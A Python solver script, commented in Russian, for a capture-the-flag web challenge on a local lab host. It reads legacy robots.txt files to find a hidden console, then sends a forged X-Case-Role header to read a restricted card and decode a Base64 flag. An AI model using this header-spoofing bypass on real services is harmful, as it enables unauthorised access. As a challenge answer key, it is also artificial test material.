#!/usr/bin/env python3
"""Эксплойт для «Дела о рыжем интерфейсе».

Киллчейн:
  1. Главная страница советует посмотреть старые инструкции роботов.
  2. Подсказка живёт в забытых легаси-правилах: /old/robots.txt
     (классический /robots.txt тоже отвечает тем же, но на стенде его
     может подменять глобальный конфиг Angie).
  3. Правила раскрывают /console.
  4. Консоль называет закрытую карточку /api/card, заголовок-маршрутизатор
     X-Case-Role с профилем archivist и Base64-конвенцию ответов.
  5. GET /api/card с X-Case-Role: archivist -> base64-флаг.

Запуск:  python3 solve.py [url]   (по умолчанию http://127.0.0.1:13436)
"""

import base64
import sys
import urllib.error
import urllib.request

url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:13436"
base = url.rstrip("/")


def get(path: str, role: str | None = None) -> bytes:
    """GET с опциональным заголовком X-Case-Role; сетевая ошибка обрывает солвер."""
    req = urllib.request.Request(base + path)
    if role:
        req.add_header("X-Case-Role", role)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.read()
    except urllib.error.HTTPError as e:
        raise SystemExit(f"[-] {path}: HTTP {e.code}")


# легаси-правила обхода: после редизайна сайта их забыли убрать
robots = get("/old/robots.txt")
try:
    assert b"/console" in robots, "легаси-robots не раскрывает консоль"
# если легаси-копия недоступна (get бросает SystemExit) — классический /robots.txt
except SystemExit:
    robots = get("/robots.txt")
    assert b"/console" in robots, "robots.txt не раскрывает консоль"

# операторская консоль раскрывает путь закрытой карточки, заголовок роли и профиль
console = get("/console")
assert b"/api/card" in console and b"X-Case-Role" in console and b"archivist" in console, (
    "консоль не раскрывает путь/заголовок/профиль"
)

# превью маршрутизируется заголовком: archivist вправе видеть закрытую карточку
card = get("/api/card", role="archivist")
# старый клиент распаковывал успешные ответы из Base64 — декодируем флаг
print(base64.b64decode(card).decode())
